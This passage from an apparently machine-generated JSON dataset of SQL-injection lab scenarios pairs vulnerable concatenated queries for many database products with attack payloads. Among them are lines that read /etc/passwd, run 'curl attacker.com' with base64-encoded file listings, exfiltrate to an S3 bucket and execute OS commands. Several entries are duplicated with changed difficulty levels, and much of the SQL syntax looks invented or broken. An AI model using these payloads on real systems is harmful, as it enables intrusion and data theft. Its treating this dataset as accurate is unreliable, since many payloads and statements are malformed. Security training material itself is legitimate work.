    "Vulnerability name": "Materialized View Data Clause Injection",
    "srcCode": "CREATE MATERIALIZED VIEW mv AS SELECT * FROM source '\\'' + userDataOption + '\\''",
    "payloads": [
      "WITH NO DATA) FROM (SELECT * FROM pg_matviews) x--",
      "WITH DATA) WHERE 1=0 UNION SELECT 1,2,3--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in SQL Server Ledger View Options",
    "Lab Description": "A blockchain application uses SQL Server Ledger with dynamic view parameters. The options are concatenated directly into ledger view creation, allowing injection during cryptographic verification.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify ledger view creation",
      "Inject through view options",
      "Trigger ledger verification",
      "Bypass blockchain validation",
      "Modify historical records"
    ],
    "Vulnerability name": "SQL Ledger View Injection",
    "srcCode": "CREATE LEDGER VIEW ledger_view WITH (LEDGER_VIEW = ON, '\\'' + userOptions + '\\'')",
    "payloads": [
      "VERIFICATION = ON) FROM (SELECT * FROM sys.database_principals) x--",
      "TRANSACTION_ID_COLUMN = id) WHERE 1=0 UNION SELECT 1--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Google BigQuery Wildcard Table Patterns",
    "Lab Description": "A data analytics tool uses BigQuery wildcard tables with dynamic patterns. The table patterns are concatenated directly into FROM clauses, allowing injection during table expansion.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify wildcard table usage",
      "Inject through table pattern",
      "Bypass pattern validation",
      "Access unauthorized datasets",
      "Exfiltrate via table expansion"
    ],
    "Vulnerability name": "BigQuery Wildcard Injection",
    "srcCode": "SELECT * FROM `project.dataset.${userPattern}`",
    "payloads": [
      "table_*` FROM (SELECT * FROM `region-us`.INFORMATION_SCHEMA.SCHEMATA) x--",
      "legit_table` WHERE _TABLE_SUFFIX = '') UNION SELECT 1,2,3--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Snowflake Session Parameter Defaults",
    "Lab Description": "A configuration tool sets Snowflake session parameters with dynamic defaults. The default expressions are concatenated directly into session initialization, allowing injection during connection setup.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify session parameter settings",
      "Inject through default value expressions",
      "Trigger new session creation",
      "Bypass parameter validation",
      "Persist settings across queries"
    ],
    "Vulnerability name": "Snowflake Session Default Injection",
    "srcCode": "ALTER SESSION SET '\\'' + userParam + '\\'' = '\\'' + userValue + '\\''",
    "payloads": [
      "TIMESTAMP_OUTPUT_FORMAT', 'YYYY-MM-DD HH24:MI:SS') FROM (SELECT * FROM information_schema.tables)--",
      "QUERY_TAG', 'test'); SELECT * FROM account_usage.access_history--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Databricks SQL Warehouse Configurations",
    "Lab Description": "A Databricks environment configures SQL warehouses with dynamic parameters. The configuration strings are concatenated directly into warehouse creation, allowing injection during cluster startup.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify warehouse creation endpoints",
      "Inject through config parameters",
      "Trigger warehouse startup",
      "Bypass config validation",
      "Access metastore via driver nodes"
    ],
    "Vulnerability name": "Databricks Warehouse Config Injection",
    "srcCode": "CREATE WAREHOUSE my_warehouse WITH '\\'' + userConfig + '\\''",
    "payloads": [
      "AUTO_STOP = 1200) FROM (SELECT * FROM system.metastore.tables)--",
      "CLUSTER_SIZE = 'Small'); SELECT * FROM hive_metastore.default.secrets--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Trino Function Namespace Paths",
    "Lab Description": "A Trino cluster creates functions with dynamic namespace paths. The namespace strings are concatenated directly into function registration, allowing injection during UDF execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify function creation endpoints",
      "Inject through namespace parameters",
      "Trigger function execution",
      "Bypass namespace validation",
      "Access system functions"
    ],
    "Vulnerability name": "Trino Function Namespace Injection",
    "srcCode": "CREATE FUNCTION '\\'' + userNamespace + '\\''.my_func() RETURNS STRING",
    "payloads": [
      "system', 'return 1') FROM (SELECT * FROM system.metadata.catalogs)--",
      "pg_catalog', 'SELECT * FROM pg_user')--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Presto Table Function Arguments",
    "Lab Description": "A Presto cluster uses table functions with dynamic arguments. The argument strings are concatenated directly into function calls, allowing injection during table generation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify table function usage",
      "Inject through function arguments",
      "Bypass argument validation",
      "Modify generated table contents",
      "Access system tables via function errors"
    ],
    "Vulnerability name": "Presto Table Function Injection",
    "srcCode": "SELECT * FROM TABLE(system.query(query => '\\'' + userQuery + '\\''))",
    "payloads": [
      "SELECT 1')) FROM (SELECT * FROM system.runtime.nodes)--",
      "SELECT * FROM tpch.sf1.customer')) WHERE 1=0 UNION SELECT 1,2,3--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in ClickHouse Dictionary Source URLs",
    "Lab Description": "A ClickHouse cluster configures external dictionaries with dynamic source URLs. The URLs are concatenated directly into dictionary definitions, allowing injection during data loading.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify dictionary creation",
      "Inject through source URL parameters",
      "Trigger dictionary reload",
      "Bypass URL validation",
      "Modify dictionary contents"
    ],
    "Vulnerability name": "ClickHouse Dictionary URL Injection",
    "srcCode": "CREATE DICTIONARY my_dict (SOURCE(HTTP(URL '\\'' + userUrl + '\\'')))",
    "payloads": [
      "http://attacker.com/payload')) FROM (SELECT * FROM system.dictionaries)--",
      "https://legit.com/data.json')) WHERE 1=0 UNION SELECT 1--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in MongoDB $expr Operator",
    "Lab Description": "A NoSQL application builds aggregation pipelines with dynamic $expr conditions. The expressions are concatenated directly into pipeline stages, allowing injection during document processing.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify $expr usage",
      "Inject through expression parameters",
      "Bypass BSON validation",
      "Execute arbitrary JavaScript",
      "Exfiltrate via aggregation output"
    ],
    "Vulnerability name": "MongoDB Expression Injection",
    "srcCode": "db.users.aggregate([{ $match: { $expr: '\\'' + userExpr + '\\'' } }])",
    "payloads": [
      "'$eq': ['$username', 'admin']}});//",
      "'$function': {'body': 'function() { return db.adminCommand({listDatabases:1}) }'}}--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in MariaDB System Versioning",
    "Lab Description": "A temporal database system uses MariaDB's system versioning with dynamic AS OF parameters. The timestamp expressions are concatenated directly into historical queries.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify SYSTEM_VERSIONING usage",
      "Inject through AS OF clauses",
      "Bypass timestamp validation",
      "Access historical data versions",
      "Modify temporal records"
    ],
    "Vulnerability name": "MariaDB Temporal Injection",
    "srcCode": "SELECT * FROM documents FOR SYSTEM_TIME AS OF '\\'' + userTime + '\\''",
    "payloads": [
      "2023-01-01') FROM (SELECT * FROM information_schema.tables)--",
      "NOW() - INTERVAL 1 DAY)) WHERE 1=0 UNION SELECT 1,2,3--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in IBM DB2 Label-Based Access Control",
    "Lab Description": "A security system uses DB2's LBAC with dynamic security label comparisons. The label expressions are concatenated directly into row filtering.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify LBAC usage",
      "Inject through SECURITY_LABEL_TO_CHAR",
      "Bypass label validation",
      "Elevate privileges",
      "Access restricted rows"
    ],
    "Vulnerability name": "DB2 LBAC Injection",
    "srcCode": "SELECT * FROM sensitive_data WHERE SECURITY_LABEL_TO_CHAR(label) = '\\'' + userLabel + '\\''",
    "payloads": [
      "TOP_SECRET') FROM (SELECT * FROM syscat.tables)--",
      "PUBLIC' OR 1=CONVERT(INT,(SELECT session_user)))--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in SAP HANA Calculation View Parameters",
    "Lab Description": "An analytics platform builds calculation views with dynamic input parameters. The parameter values are concatenated directly into view execution.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify calculation view usage",
      "Inject through input parameters",
      "Bypass parameter validation",
      "Access underlying tables",
      "Manipulate analytical results"
    ],
    "Vulnerability name": "HANA Calc View Injection",
    "srcCode": "SELECT * FROM \"_SYS_BIC\".\"package/calc_view\"('PLACEHOLDER' = ('\\'' + userParam + '\\''))",
    "payloads": [
      "param1', 'value1') FROM (SELECT * FROM \"_SYS_STATISTICS\".\"STATISTICS\")--",
      "$$param$$', '1'')) WITH PARAMETERS ($$param2$$='admin')--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Teradata Query Banding",
    "Lab Description": "A monitoring system uses Teradata query bands with dynamic session attributes. The band values are concatenated directly into workload management.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify SET QUERY_BAND usage",
      "Inject through band parameters",
      "Bypass workload rules",
      "Elevate priority",
      "Access restricted workloads"
    ],
    "Vulnerability name": "Teradata Query Band Injection",
    "srcCode": "SET QUERY_BAND = '\\'' + userBand + '\\'' FOR SESSION",
    "payloads": [
      "app=reporting') FROM dbc.tables--",
      "urgency=Hard;SELECT * FROM dbc.users;--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Oracle Text CONTAINS Scoring",
    "Lab Description": "A search application builds Oracle Text queries with dynamic score expressions. The scoring parameters are concatenated directly into CONTAINS operations.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify SCORE() usage",
      "Inject through label parameters",
      "Bypass score validation",
      "Manipulate result ranking",
      "Access restricted documents"
    ],
    "Vulnerability name": "Oracle Text Score Injection",
    "srcCode": "SELECT SCORE(1) FROM docs WHERE CONTAINS(text, '\\'' + userQuery + '\\'', 1) > 0",
    "payloads": [
      "search_term') FROM (SELECT * FROM ctxsys.ctx_indexes)--",
      "test'' AND 1=ctxsys.driload.validate_stmt('SELECT * FROM sys.user$')--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in SQLite FTS5 Virtual Table Options",
    "Lab Description": "A mobile app creates SQLite FTS5 tables with dynamic content options. The configuration strings are concatenated directly into full-text search setup.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify FTS5 table creation",
      "Inject through content= parameters",
      "Bypass tokenizer validation",
      "Access source table data",
      "Manipulate search indexes"
    ],
    "Vulnerability name": "SQLite FTS5 Option Injection",
    "srcCode": "CREATE VIRTUAL TABLE fts_table USING fts5(content='\\'' + userContent + '\\'')",
    "payloads": [
      "source_table') FROM (SELECT * FROM sqlite_master)--",
      "real_table'' WHERE 1=0 UNION SELECT 1,2,3--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Cassandra CQL User-Defined Function Imports",
    "Lab Description": "A Cassandra cluster creates UDFs with dynamic import declarations. The import paths are concatenated directly into function compilation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify CREATE FUNCTION usage",
      "Inject through import parameters",
      "Bypass sandbox restrictions",
      "Load malicious classes",
      "Execute Java code"
    ],
    "Vulnerability name": "Cassandra UDF Import Injection",
    "srcCode": "CREATE FUNCTION my_func RETURNS text LANGUAGE java AS '\\'' + userCode + '\\'' USING '\\'' + userImports + '\\''",
    "payloads": [
      "attacker.com/Malicious.class') FROM system_schema.functions--",
      "java.lang.Runtime')) { return Runtime.getRuntime().exec('id'); }--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Neo4j APOC Load CSV Headers",
    "Lab Description": "A graph ETL pipeline uses APOC's load CSV with dynamic header mappings. The header parameters are concatenated directly into file imports.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify apoc.load.csv usage",
      "Inject through header mappings",
      "Bypass CSV validation",
      "Modify graph structure",
      "Access local files"
    ],
    "Vulnerability name": "Neo4j CSV Header Injection",
    "srcCode": "CALL apoc.load.csv('file.csv', { header: '\\'' + userHeaders + '\\'' })",
    "payloads": [
      "true') FROM (MATCH (n) RETURN n LIMIT 1)--",
      "false'}) YIELD line WHERE 1=0 UNION MATCH (n) RETURN n--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in RedisGraph Query Aliases",
    "Lab Description": "A Redis module builds graph queries with dynamic node aliases. The alias names are concatenated directly into Cypher execution.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify GRAPH.QUERY usage",
      "Inject through alias parameters",
      "Bypass parser validation",
      "Access unauthorized nodes",
      "Modify graph properties"
    ],
    "Vulnerability name": "RedisGraph Alias Injection",
    "srcCode": "GRAPH.QUERY 'MATCH ('\\'' + userAlias + '\\'') RETURN *'",
    "payloads": [
      "n) WHERE n.property = 1 RETURN n--",
      "a)-[r]->(b) WHERE 1=redis.call('INFO')--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in ArangoDB AQL PRUNE Conditions",
    "Lab Description": "A document traversal system builds AQL queries with dynamic PRUNE clauses. The conditions are concatenated directly into graph traversals.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify PRUNE usage",
      "Inject through traversal conditions",
      "Bypass depth limits",
      "Access restricted paths",
      "Modify document links"
    ],
    "Vulnerability name": "ArangoDB PRUNE Injection",
    "srcCode": "FOR v IN 1..5 OUTBOUND 'docs/start' GRAPH 'my_graph' PRUNE '\\'' + userCondition + '\\''",
    "payloads": [
      "v._key == 'secret') RETURN v--",
      "1==1) FILTER CURRENT_USER() == 'root' RETURN 1--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in CouchDB Mango Query Operators",
    "Lab Description": "A document store uses CouchDB's Mango with dynamic operator selection. The operator names are concatenated directly into find operations.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify $operator usage",
      "Inject through operator parameters",
      "Bypass JSON validation",
      "Access design documents",
      "Execute admin functions"
    ],
    "Vulnerability name": "CouchDB Operator Injection",
    "srcCode": "db.find({ selector: { field: { '\\'' + userOp + '\\'': '\\'' + userVal + '\\'' } } })",
    "payloads": [
      "$eq': 1, '$where': '1==1' }--",
      "$ne': 0 }); this.constructor.require('child_process').exec('id')--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in InfluxDB Flux Pivot Columns",
    "Lab Description": "A time-series dashboard builds Flux queries with dynamic pivot columns. The column names are concatenated directly into data reshaping.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify pivot() usage",
      "Inject through column parameters",
      "Bypass schema validation",
      "Manipulate time buckets",
      "Access system measurements"
    ],
    "Vulnerability name": "Flux Pivot Injection",
    "srcCode": "from(bucket:\"metrics\") |> pivot(rowKey:[\"_time\"], columnKey:[\"\\'' + userCol + '\\'\"])",
    "payloads": [
      "_measurement\") FROM (SELECT * FROM _internal.monitor)--",
      "_field\"]) |> yield(name: \"exploit\")--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in TimescaleDB Continuous Aggregate Policies",
    "Lab Description": "A time-series platform configures continuous aggregates with dynamic refresh policies. The policy parameters are concatenated directly into materialized view maintenance.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify add_continuous_aggregate_policy",
      "Inject through schedule parameters",
      "Trigger materialization jobs",
      "Bypass time bucket validation",
      "Compromise hypertable data"
    ],
    "Vulnerability name": "Timescale Policy Injection",
    "srcCode": "SELECT add_continuous_aggregate_policy('\\'' + userView + '\\'', '\\'' + userInterval + '\\'')",
    "payloads": [
      "my_view', INTERVAL '1 hour')) FROM _timescaledb_catalog.hypertable--",
      "sensitive_view', INTERVAL '1 day'))) RETURNING *--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in CockroachDB Changefeed Filters",
    "Lab Description": "A CDC pipeline creates changefeeds with dynamic filter expressions. The filters are concatenated directly into change event generation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify changefeed creation",
      "Inject through filter parameter",
      "Trigger change events",
      "Bypass CDC validation",
      "Exfiltrate via webhook payloads"
    ],
    "Vulnerability name": "CockroachCDC Filter Injection",
    "srcCode": "CREATE CHANGEFEED FOR TABLE users WITH filter = '\\'' + userFilter + '\\''",
    "payloads": [
      "SELECT * FROM users WHERE type = 'admin'--",
      "SELECT *, (SELECT version()) FROM users--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in DuckDB S3 Endpoint Configuration",
    "Lab Description": "A data pipeline configures DuckDB's S3 extension with dynamic endpoints. The connection strings are concatenated directly into cloud storage operations.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify S3 configuration points",
      "Inject through endpoint parameters",
      "Bypass URL validation",
      "Modify remote data access",
      "Exfiltrate credentials"
    ],
    "Vulnerability name": "DuckDB S3 Endpoint Injection",
    "srcCode": "SET s3_endpoint='\\'' + userEndpoint + '\\''",
    "payloads": [
      "attacker.com') FROM (SELECT * FROM duckdb_settings)--",
      "legit.s3.amazonaws.com'; COPY (SELECT * FROM sqlite_master) TO 's3://exfil/'--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Materialized View WITH NO DATA Clause",
    "Lab Description": "A data warehouse creates materialized views with dynamic data loading options. The WITH DATA clauses are concatenated directly into view creation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify materialized view creation",
      "Inject through WITH DATA parameter",
      "Trigger view population",
      "Bypass data validation",
      "Modify view contents"
    ],
    "Vulnerability name": "Materialized View Data Clause Injection",
    "srcCode": "CREATE MATERIALIZED VIEW mv AS SELECT * FROM source '\\'' + userDataOption + '\\''",
    "payloads": [
      "WITH NO DATA) FROM (SELECT * FROM pg_matviews) x--",
      "WITH DATA) WHERE 1=0 UNION SELECT 1,2,3--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in SQL Server Ledger View Options",
    "Lab Description": "A blockchain application uses SQL Server Ledger with dynamic view parameters. The options are concatenated directly into ledger view creation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify ledger view creation",
      "Inject through view options",
      "Trigger ledger verification",
      "Bypass blockchain validation",
      "Modify historical records"
    ],
    "Vulnerability name": "SQL Ledger View Injection",
    "srcCode": "CREATE LEDGER VIEW ledger_view WITH (LEDGER_VIEW = ON, '\\'' + userOptions + '\\'')",
    "payloads": [
      "VERIFICATION = ON) FROM (SELECT * FROM sys.database_principals) x--",
      "TRANSACTION_ID_COLUMN = id) WHERE 1=0 UNION SELECT 1--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Google BigQuery Wildcard Table Patterns",
    "Lab Description": "A data analytics tool uses BigQuery wildcard tables with dynamic patterns. The table patterns are concatenated directly into FROM clauses.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify wildcard table usage",
      "Inject through table pattern",
      "Bypass pattern validation",
      "Access unauthorized datasets",
      "Exfiltrate via table expansion"
    ],
    "Vulnerability name": "BigQuery Wildcard Injection",
    "srcCode": "SELECT * FROM `project.dataset.${userPattern}`",
    "payloads": [
      "table_*` FROM (SELECT * FROM `region-us`.INFORMATION_SCHEMA.SCHEMATA) x--",
      "legit_table` WHERE _TABLE_SUFFIX = '') UNION SELECT 1,2,3--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Snowflake Session Parameter Defaults",
    "Lab Description": "A configuration tool sets Snowflake session parameters with dynamic defaults. The default expressions are concatenated directly into session initialization.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify session parameter settings",
      "Inject through default value expressions",
      "Trigger new session creation",
      "Bypass parameter validation",
      "Persist settings across queries"
    ],
    "Vulnerability name": "Snowflake Session Default Injection",
    "srcCode": "ALTER SESSION SET '\\'' + userParam + '\\'' = '\\'' + userValue + '\\''",
    "payloads": [
      "TIMESTAMP_OUTPUT_FORMAT', 'YYYY-MM-DD HH24:MI:SS') FROM (SELECT * FROM information_schema.tables)--",
      "QUERY_TAG', 'test'); SELECT * FROM account_usage.access_history--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Databricks SQL Warehouse Configurations",
    "Lab Description": "A Databricks environment configures SQL warehouses with dynamic parameters. The configuration strings are concatenated directly into warehouse creation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify warehouse creation endpoints",
      "Inject through config parameters",
      "Trigger warehouse startup",
      "Bypass config validation",
      "Access metastore via driver nodes"
    ],
    "Vulnerability name": "Databricks Warehouse Config Injection",
    "srcCode": "CREATE WAREHOUSE my_warehouse WITH '\\'' + userConfig + '\\''",
    "payloads": [
      "AUTO_STOP = 1200) FROM (SELECT * FROM system.metastore.tables)--",
      "CLUSTER_SIZE = 'Small'); SELECT * FROM hive_metastore.default.secrets--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Trino Function Namespace Paths",
    "Lab Description": "A Trino cluster creates functions with dynamic namespace paths. The namespace strings are concatenated directly into function registration.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify function creation endpoints",
      "Inject through namespace parameters",
      "Trigger function execution",
      "Bypass namespace validation",
      "Access system functions"
    ],
    "Vulnerability name": "Trino Function Namespace Injection",
    "srcCode": "CREATE FUNCTION '\\'' + userNamespace + '\\''.my_func() RETURNS STRING",
    "payloads": [
      "system', 'return 1') FROM (SELECT * FROM system.metadata.catalogs)--",
      "pg_catalog', 'SELECT * FROM pg_user')--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Presto Table Function Arguments",
    "Lab Description": "A Presto cluster uses table functions with dynamic arguments. The argument strings are concatenated directly into function calls.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify table function usage",
      "Inject through function arguments",
      "Bypass argument validation",
      "Modify generated table contents",
      "Access system tables via function errors"
    ],
    "Vulnerability name": "Presto Table Function Injection",
    "srcCode": "SELECT * FROM TABLE(system.query(query => '\\'' + userQuery + '\\''))",
    "payloads": [
      "SELECT 1')) FROM (SELECT * FROM system.runtime.nodes)--",
      "SELECT * FROM tpch.sf1.customer')) WHERE 1=0 UNION SELECT 1,2,3--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in PostgreSQL COPY TO PROGRAM",
    "Lab Description": "A data export feature uses COPY TO with dynamic program execution. The command strings are concatenated directly into shell command execution.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify COPY TO PROGRAM usage",
      "Inject through command parameter",
      "Bypass shell metacharacter filtering",
      "Execute OS commands",
      "Exfiltrate via program output"
    ],
    "Vulnerability name": "PostgreSQL COPY Command Injection",
    "srcCode": "COPY (SELECT * FROM table) TO PROGRAM '\\'' + userCommand + '\\''",
    "payloads": [
      "cat /etc/passwd > /tmp/leak",
      "curl attacker.com/?exfil=$(ls | base64)"
    ]
  },
  {
    "Lab scenario": "SQL Injection in MySQL X Protocol Authentication",
    "Lab Description": "A custom authentication plugin uses X Protocol with dynamic queries. The auth strings are concatenated directly into connection handshakes.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify X Plugin authentication",
      "Inject through auth attributes",
      "Bypass protocol validation",
      "Execute queries during handshake",
      "Access server metadata"
    ],
    "Vulnerability name": "MySQL X Protocol Injection",
    "srcCode": "mysqlx.getSession({auth: '\\'' + userAuth + '\\''})",
    "payloads": [
      "PLAIN\" }); SELECT * FROM mysql.user --",
      "EXTERNAL\" }); SHOW DATABASES --"
    ]
  },
  {
    "Lab scenario": "SQL Injection in SQL Server External Script Parameters",
    "Lab Description": "A machine learning service uses sp_execute_external_script with dynamic R/Python parameters. The script arguments are concatenated directly into execution.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify external script usage",
      "Inject through @params argument",
      "Bypass language sandboxing",
      "Execute arbitrary code",
      "Access file system"
    ],
    "Vulnerability name": "SQL Server External Script Injection",
    "srcCode": "EXEC sp_execute_external_script @language='R', @script='\\'' + userCode + '\\''",
    "payloads": [
      "system('whoami')",
      "write.csv(list.files(), '/tmp/loot')"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Oracle SDO_UTIL.TO_GEOJSON",
    "Lab Description": "A GIS application converts geometries to GeoJSON with dynamic properties. The attribute lists are concatenated directly into JSON generation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify SDO_UTIL.TO_GEOJSON calls",
      "Inject through properties parameter",
      "Bypass JSON validation",
      "Access spatial metadata",
      "Exfiltrate via malformed GeoJSON"
    ],
    "Vulnerability name": "Oracle GeoJSON Injection",
    "srcCode": "SDO_UTIL.TO_GEOJSON(geom, '\\'' + userProps + '\\'')",
    "payloads": [
      "'properties') FROM ALL_SDO_GEOM_METADATA --",
      "'{\"a\":(SELECT * FROM ALL_USERS)'}"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Snowflake External Table Refresh",
    "Lab Description": "A cloud pipeline refreshes external tables with dynamic location patterns. The path strings are concatenated directly into metadata updates.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify ALTER EXTERNAL TABLE",
      "Inject through location parameters",
      "Bypass path validation",
      "Access unauthorized storage",
      "Poison metadata cache"
    ],
    "Vulnerability name": "Snowflake External Table Poisoning",
    "srcCode": "ALTER EXTERNAL TABLE ext_table REFRESH '\\'' + userPath + '\\''",
    "payloads": [
      "s3://legit/path') FROM INFORMATION_SCHEMA.EXTERNAL_TABLES --",
      "s3://attacker/exfil')) LIST @~/staged"
    ]
  },
  {
    "Lab scenario": "SQL Injection in BigQuery JavaScript UDF Inline Code",
    "Lab Description": "A data transformation uses JavaScript UDFs with dynamic code. The script bodies are concatenated directly into function execution.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify CREATE TEMP FUNCTION usage",
      "Inject through JavaScript code",
      "Bypass sandbox restrictions",
      "Access other query contexts",
      "Execute arbitrary BigQuery SQL"
    ],
    "Vulnerability name": "BigQuery JS UDF Injection",
    "srcCode": "CREATE TEMP FUNCTION my_func() RETURNS STRING LANGUAGE js AS '\\'' + userCode + '\\''",
    "payloads": [
      "`${BigQuery.execute('SELECT * FROM sensitive_data')}`",
      "process.env.GCP_PROJECT"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Azure Synapse Spark Notebook Parameters",
    "Lab Description": "A Synapse Spark notebook accepts dynamic SQL parameters. The values are concatenated directly into PySpark/SQL cell execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify notebook parameter usage",
      "Inject through widget values",
      "Bypass notebook sanitization",
      "Access linked services",
      "Execute cross-workspace queries"
    ],
    "Vulnerability name": "Synapse Notebook Injection",
    "srcCode": "val query = \"SELECT * FROM table WHERE id = '\\'' + userParam + '\\''\"",
    "payloads": [
      "1' UNION SELECT * FROM sensitive_table --",
      "' || (SELECT TOP 1 name FROM sys.sql_logins) || '"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Amazon Redshift SUPER Type Casting",
    "Lab Description": "A semi-structured data system uses dynamic casts to SUPER type. The type expressions are concatenated directly into JSON processing.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify SUPER type usage",
      "Inject through cast expressions",
      "Bypass JSON validation",
      "Access other columns",
      "Exfiltrate via malformed JSON"
    ],
    "Vulnerability name": "Redshift SUPER Cast Injection",
    "srcCode": "SELECT json_column::'\\'' + userType + '\\'' FROM table",
    "payloads": [
      "SUPER') FROM SVV_TABLE_INFO --",
      "VARCHAR)) FROM (SELECT * FROM PG_USER)"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Google Cloud Spanner DDL Change Streams",
    "Lab Description": "A schema migration tool creates change streams with dynamic DDL filters. The filter strings are concatenated directly into schema change tracking.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify CREATE CHANGE STREAM",
      "Inject through DDL filter clauses",
      "Bypass DDL validation",
      "Access schema history",
      "Tamper with change events"
    ],
    "Vulnerability name": "Spanner DDL Stream Injection",
    "srcCode": "CREATE CHANGE STREAM stream FOR '\\'' + userDDL + '\\''",
    "payloads": [
      "ALL') FROM INFORMATION_SCHEMA.CHANGE_STREAMS --",
      "CREATE_TABLE,ALTER_TABLE'))) SELECT * FROM SPANNER_SYS.TABLES@{}"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Databricks Unity Catalog Table Comments",
    "Lab Description": "A data governance system updates table comments dynamically. The comment text is concatenated directly into ALTER TABLE statements.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify ALTER TABLE SET COMMENT",
      "Inject through comment parameter",
      "Bypass string sanitization",
      "Execute embedded SQL",
      "Access catalog metadata"
    ],
    "Vulnerability name": "Unity Catalog Comment Injection",
    "srcCode": "ALTER TABLE table SET COMMENT '\\'' + userComment + '\\''",
    "payloads": [
      "Test comment') FROM system.information_schema.tables --",
      "Legit comment'; SELECT * FROM hive_metastore.default.secrets --"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Snowpark Python Stored Procedures",
    "Lab Description": "A Snowflake Snowpark app creates Python UDFs with dynamic code. The Python source is concatenated directly into procedure creation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify CREATE PROCEDURE usage",
      "Inject through Python code",
      "Bypass sandbox restrictions",
      "Access session state",
      "Execute arbitrary SQL"
    ],
    "Vulnerability name": "Snowpark Python Injection",
    "srcCode": "CREATE PROCEDURE my_proc() RETURNS STRING LANGUAGE PYTHON AS '\\'' + userCode + '\\''",
    "payloads": [
      "session.sql('SELECT * FROM sensitive_data').collect()",
      "import os; os.system('curl attacker.com')"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Azure Cosmos DB SQL API User-Defined Functions",
    "Lab Description": "A NoSQL application creates UDFs with dynamic JavaScript. The function bodies are concatenated directly into query execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify UDF creation",
      "Inject through JavaScript code",
      "Bypass scope limitations",
      "Access other documents",
      "Execute malicious queries"
    ],
    "Vulnerability name": "CosmosDB UDF Injection",
    "srcCode": "function userDefinedFunction(\\'' + userParams + '\\'') { '\\'' + userBody + '\\'' }",
    "payloads": [
      "input) { return __.filter(function(doc) { return true }); }",
      "doc) { return __.executeSql('SELECT * FROM c'); }"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Elasticsearch SQL ODBC Driver Connection Strings",
    "Lab Description": "An analytics tool builds ODBC connections with dynamic properties. The connection strings are concatenated directly into driver initialization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify ODBC connection points",
